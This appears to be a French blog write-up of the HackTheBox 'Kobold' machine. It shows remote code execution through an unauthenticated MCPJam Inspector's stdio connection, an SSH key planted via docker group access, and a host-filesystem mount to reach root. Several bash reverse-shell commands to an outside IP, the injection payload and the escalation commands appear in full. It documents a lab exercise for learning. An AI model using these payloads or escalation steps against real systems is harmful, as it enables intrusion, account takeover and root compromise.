---
title: "HackTheBox - Kobold"
date: 2026-03-21 23:30:00 +0200
categories: [HackTheBox, Challenge, Easy]
tags: [mcp, stdio-injection, vhost, privatebin, arcane, docker, mcp-tool-poisoning, ssrf, newgrp, ssh-injection]
description: "Write-up de la machine Kobold — Exploitation d'un serveur MCP via stdio injection pour RCE, puis escalade de ben → alice via Docker group (newgrp + injection de clé SSH), et alice → root via docker run avec montage du filesystem hôte."
image:
  path: /assets/img/posts/kobold/kobold.png
  alt: "HackTheBox - Kobold"
---

## Informations sur la machine

| Propriété      | Valeur                                     |
| -------------- | ------------------------------------------ |
| **OS**         | Linux                                      |
| **Difficulté** | Easy                                       |
| **IP**         | 10.129.15.125                              |
| **Domaines**   | kobold.htb, mcp.kobold.htb, bin.kobold.htb |

---

## Outils utilisés

| Outil           | Rôle                                        |
| --------------- | ------------------------------------------- |
| **nmap**        | Scan de ports et détection de services      |
| **feroxbuster** | Énumération de répertoires                  |
| **ffuf**        | Énumération de vhosts                       |
| **curl**        | Interaction avec les APIs MCP et PrivateBin |
| **python3/mcp** | Serveur MCP evil (SSE transport)            |
| **ssh**         | Accès final en tant qu'alice                |

---

## Reconnaissance

### Scan initial

```bash
nmap -sC -sV 10.129.15.125
```

Trois ports ouverts : **22** (SSH), **80** (nginx → redirect HTTPS), **443** (HTTPS nginx).

Le site principal `kobold.htb` est un "Coming Soon" — surface d'attaque limitée en apparence.

### Découverte de vhosts

```bash
ffuf -u https://kobold.htb/ -H "Host: FUZZ.kobold.htb" \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -mc all -fs 154,3812 -k -t 50
```

Deux vhosts découverts :
- `mcp.kobold.htb` — **MCPJam Inspector** (interface de gestion de serveurs MCP)
- `bin.kobold.htb` — **PrivateBin** (pastebin chiffré)

---

## Foothold — RCE via MCP stdio injection

### Analyse de MCPJam

`mcp.kobold.htb` expose une interface MCPJam Inspector permettant de connecter des serveurs MCP (Model Context Protocol). L'analyse du JS minifié révèle les endpoints clés :

```bash
curl -sk https://mcp.kobold.htb/assets/index-DRYhT9Xb.js | \
  grep -oE '"/api/[^"]*"' | sort -u
```

Endpoints critiques identifiés :
- `/api/mcp/connect` — connexion à un serveur MCP
- `/api/mcp/tools/execute` — exécution d'un tool
- `/api/mcp/tools/list` — liste des tools disponibles

### Test du callback SSE

En connectant un serveur sous contrôle (type SSE), la box rappelle immédiatement :

```bash
# Terminal 1 - listener
nc -lvnp 9001

# Terminal 2 - connexion
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverId":"test","serverConfig":{"name":"t","url":"http://10.10.15.134:9001/sse","type":"sse"}}'
```

Le serveur initie une connexion GET `/sse` depuis `10.129.15.125` — callback confirmé.

### Découverte du transport stdio

L'interface accepte également le type de connexion `stdio` qui **exécute une commande directement sur le serveur** :

```bash
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverId":"rs1","serverConfig":{"name":"rs","type":"stdio","command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/10.10.15.134/4444 0>&1"]}}'
```

Avec un listener `nc -lvnp 4444`, on obtient un shell en tant que **ben** :

```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

---

## Enumération en tant que ben

### Flag user

```bash
cat ~/user.txt
```

### Services internes

```bash
ss -tlnp
```

Ports internes identifiés :
- `127.0.0.1:6274` — MCPJam Node.js
- `127.0.0.1:8080` — PrivateBin (Docker proxy → `172.17.0.2:8080`)
- `*:3552` — **Arcane** (gestionnaire Docker, SvelteKit + Go)

### Service Arcane

```bash
systemctl cat arcane.service
```

Le service expose une `ENCRYPTION_KEY` et tourne en **root** depuis `/root/arcane_linux_amd64`.

### Groupe operator

Ben est dans le groupe `operator` qui donne accès en écriture à `/privatebin-data/data/`. Les pastes chiffrés sont stockés dans des sous-répertoires inaccessibles.

### Groupes d'alice

```bash
grep -E "alice|docker" /etc/group
```

Alice est dans le groupe **docker** — vecteur d'escalade identifié.

---

## Pivot ben → alice

### Rejoindre le groupe docker avec newgrp

Le binaire `newgrp` est SUID et permet de changer de groupe actif sans mot de passe :

```bash
newgrp docker
id
# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
```

### Injection de clé SSH dans le home d'alice

Grâce au groupe docker, on peut monter le filesystem hôte dans un container :

```bash
# Génération d'une paire de clés
ssh-keygen -t ed25519 -f /tmp/alice_key -N ""

# Injection via Docker (root dans le container contourne les permissions 700)
docker run -v /:/mnt --rm --entrypoint bash mysql -c \
  "mkdir -p /mnt/home/alice/.ssh && \
   echo '$(cat /tmp/alice_key.pub)' >> /mnt/home/alice/.ssh/authorized_keys && \
   chmod 700 /mnt/home/alice/.ssh && \
   chmod 600 /mnt/home/alice/.ssh/authorized_keys && \
   chown -R 1002:1002 /mnt/home/alice/.ssh"
```

### Connexion SSH en tant qu'alice

```bash
ssh -i /tmp/alice_key -o StrictHostKeyChecking=no alice@127.0.0.1 \
  "bash -i >& /dev/tcp/10.10.15.134/5555 0>&1"
```

```
uid=1002(alice) gid=1002(alice) groups=1002(alice),37(operator),111(docker)
```

---

## Privilege Escalation — alice → root

### Accès root via Docker

Alice est également dans le groupe **docker**. La même technique d'escalade s'applique directement pour lire le flag root :

```bash
docker run -v /:/mnt --rm --entrypoint bash mysql -c "cat /mnt/root/root.txt"
```

Ou pour obtenir un shell root interactif :

```bash
docker run -v /:/mnt --rm --entrypoint bash mysql -c \
  "chroot /mnt bash -c 'bash -i >& /dev/tcp/10.10.15.134/6666 0>&1'"
```

---

## Flags

```bash
cat /home/ben/user.txt
cat /root/root.txt  # via docker
```

---

## Récapitulatif de la chaîne d'exploitation

```
kobold.htb (Coming Soon)
  │
  └─ ffuf vhost enumeration
      └─ mcp.kobold.htb → MCPJam Inspector
          │
          └─ /api/mcp/connect type=stdio → command injection
              └─ RCE → shell ben
                  │
                  ├─ user.txt
                  │
                  └─ newgrp docker (SUID binary)
                      └─ docker run -v /:/mnt mysql
                          └─ Injection clé SSH dans /home/alice/.ssh/
                              └─ SSH alice@localhost
                                  │
                                  └─ docker run -v /:/mnt mysql
                                      └─ cat /root/root.txt ✓
```

---

## Ressources

- [Model Context Protocol — MCP Specification](https://modelcontextprotocol.io/)
- [MCPJam Inspector](https://github.com/MCPJam/inspector)
- [Docker privilege escalation via group membership](https://gtfobins.github.io/gtfobins/docker/)
- [newgrp — GTFOBins](https://gtfobins.github.io/gtfobins/newgrp/)

---

## Leçons apprises

- **Le transport `stdio` de MCP exécute des commandes localement** — c'est le vecteur le plus direct. Les interfaces MCPJam exposées sans authentification permettent de connecter n'importe quel type de serveur, y compris stdio qui lance directement des processus sur le serveur.
- **newgrp est souvent négligé dans l'énumération SUID** — il permet de changer de groupe actif et d'accéder immédiatement aux ressources d'un groupe sans password, à condition que l'utilisateur soit déjà membre du groupe dans `/etc/group`.
- **Docker group = root** — appartenir au groupe docker est équivalent à avoir les droits root. Le montage du filesystem hôte avec `docker run -v /:/mnt` permet une lecture/écriture totale, bypasse les permissions Unix, et permet l'injection dans n'importe quel fichier système.
- **Les vhosts sont une surface d'attaque sous-estimée** — `kobold.htb` semblait vide (Coming Soon) alors que `mcp.kobold.htb` exposait une interface critique. L'énumération des vhosts doit toujours précéder le fuzzing de contenu.

**Machine complétée**

{% include comments.html %}